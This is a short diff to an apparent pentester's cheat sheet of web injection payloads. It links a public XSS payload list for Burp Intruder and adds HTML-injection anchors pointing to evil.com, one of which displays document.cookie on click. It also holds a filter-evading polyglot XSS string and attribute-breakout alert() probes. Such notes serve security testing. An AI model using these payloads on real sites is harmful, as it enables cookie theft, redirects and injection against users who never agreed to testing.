@@ -1,6 +1,10 @@
 XSS Payload link for the intruder: 
 https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
 
+##HTML INJECTION 
+<a href="https://evil.com" onclick="alert(document.cookie)">Click here</a> 
+<h1><i><u>html injection</i></u></h1><a href="https://evil.com">open redirect</a> 
+
 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
